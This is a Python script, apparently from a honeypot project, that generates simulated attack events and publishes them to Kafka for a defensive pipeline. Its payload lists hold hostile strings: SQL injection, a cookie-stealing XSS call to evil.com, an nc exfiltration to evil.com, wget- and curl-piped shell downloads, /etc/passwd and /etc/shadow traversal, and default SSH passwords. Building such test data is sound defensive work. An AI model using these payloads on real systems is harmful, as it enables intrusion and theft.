#!/usr/bin/env python3
"""
simulate_attack.py – Generate realistic honeypot attack events.
Usage: python scripts/simulate_attack.py [--count 50]
"""
import argparse
import json
import random
import time
import sys
import os
from datetime import datetime, timezone

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from kafka import KafkaProducer

KAFKA_SERVERS = os.getenv("KAFKA_BOOTSTRAP_SERVERS", "localhost:9092")

ATTACK_TYPES = [
    {"type": "SQL Injection", "protocol": "HTTP", "severity_range": (70, 100),
     "payloads": [
         "GET /?id=1' OR '1'='1 HTTP/1.1",
         "POST /login username=admin'--&password=x",
         "GET /search?q=1 UNION SELECT table_name,null FROM information_schema.tables--",
         "'; DROP TABLE users; --",
     ]},
    {"type": "XSS", "protocol": "HTTP", "severity_range": (40, 80),
     "payloads": [
         'GET /comment?text=<script>alert(document.cookie)</script>',
         'POST /profile name=<img src=x onerror=fetch("https://evil.com/steal?c="+document.cookie)>',
     ]},
    {"type": "Path Traversal", "protocol": "HTTP", "severity_range": (60, 90),
     "payloads": [
         "GET /../../../etc/passwd HTTP/1.1",
         "GET /download?file=../../../../etc/shadow",
         "GET /static/%2e%2e%2f%2e%2e%2fetc/passwd",
     ]},
    {"type": "Brute Force", "protocol": "SSH", "severity_range": (50, 85),
     "payloads": [
         "username=root password=password123",
         "username=admin password=admin",
         "username=ubuntu password=ubuntu",
         "username=pi password=raspberry",
     ]},
    {"type": "Command Injection", "protocol": "HTTP", "severity_range": (80, 100),
     "payloads": [
         "GET /ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1",
         "POST /exec cmd=id|nc evil.com 4444",
         "GET /?cmd=`wget http://malicious.com/shell.sh -O /tmp/s && bash /tmp/s`",
     ]},
    {"type": "Port Scan", "protocol": "TCP", "severity_range": (10, 40),
     "payloads": ["SYN probe", "CONNECT scan", "NULL scan", "FIN scan"]},
    {"type": "Directory Enumeration", "protocol": "HTTP", "severity_range": (20, 55),
     "payloads": [
         "GET /admin HTTP/1.1", "GET /.git/config HTTP/1.1",
         "GET /wp-admin HTTP/1.1", "GET /.env HTTP/1.1",
         "GET /backup.zip HTTP/1.1",
     ]},
    {"type": "RCE Attempt", "protocol": "HTTP", "severity_range": (85, 100),
     "payloads": [
         "POST /cgi-bin/test.cgi data=`curl http://10.0.0.1/shell|sh`",
         "GET /api/v1/eval?code=__import__('os').system('id')",
         "POST /xmlrpc.php <?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>",
     ]},
]

GEO_DATA = [
    {"country": "Russia", "city": "Moscow", "lat": 55.75, "lon": 37.62},
    {"country": "China", "city": "Beijing", "lat": 39.90, "lon": 116.40},
    {"country": "Romania", "city": "Bucharest", "lat": 44.43, "lon": 26.10},
    {"country": "Brazil", "city": "São Paulo", "lat": -23.55, "lon": -46.63},
    {"country": "United States", "city": "Chicago", "lat": 41.88, "lon": -87.63},
    {"country": "Germany", "city": "Frankfurt", "lat": 50.11, "lon": 8.68},
    {"country": "Netherlands", "city": "Amsterdam", "lat": 52.37, "lon": 4.90},
    {"country": "South Korea", "city": "Seoul", "lat": 37.57, "lon": 126.98},
    {"country": "Iran", "city": "Tehran", "lat": 35.69, "lon": 51.39},
    {"country": "Ukraine", "city": "Kharkiv", "lat": 49.99, "lon": 36.23},
]


def random_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def generate_attack() -> dict:
    attack_def = random.choice(ATTACK_TYPES)
    geo = random.choice(GEO_DATA)
    sev_min, sev_max = attack_def["severity_range"]
    severity = random.randint(sev_min, sev_max)

    return {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source_ip": random_ip(),
        "source_port": random.randint(1024, 65535),
        "protocol": attack_def["protocol"],
        "attack_type": attack_def["type"],
        "payload": random.choice(attack_def["payloads"]),
        "severity": severity,
        "geo_country": geo["country"],
        "geo_city": geo["city"],
        "latitude": geo["lat"] + random.uniform(-1, 1),
        "longitude": geo["lon"] + random.uniform(-1, 1),
        "headers": {
            "User-Agent": random.choice([
                "Mozilla/5.0 zgrab/0.x",
                "python-requests/2.28.0",
                "Masscan/1.3",
                "curl/7.68.0",
                "Nuclei - Open-source project",
            ]),
            "X-Forwarded-For": random_ip(),
        },
        "signatures": [attack_def["type"]],
    }


def main():
    parser = argparse.ArgumentParser(description="Simulate honeypot attacks")
    parser.add_argument("--count", type=int, default=20, help="Number of attack events")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between events (seconds)")
    args = parser.parse_args()

    try:
        producer = KafkaProducer(
            bootstrap_servers=KAFKA_SERVERS,
            value_serializer=lambda v: json.dumps(v).encode("utf-8"),
        )
    except Exception as e:
        print(f"[Simulator] Cannot connect to Kafka at {KAFKA_SERVERS}: {e}")
        print("[Simulator] Printing events to stdout instead:")
        for i in range(args.count):
            print(json.dumps(generate_attack(), indent=2))
        return

    print(f"[Simulator] Sending {args.count} attack events to Kafka topic 'raw-attacks'")
    for i in range(args.count):
        event = generate_attack()
        producer.send("raw-attacks", value=event)
        print(f"[{i+1}/{args.count}] {event['attack_type']} from {event['source_ip']} (severity={event['severity']})")
        time.sleep(args.delay)

    producer.flush()
    print("[Simulator] Done.")


if __name__ == "__main__":
    main()
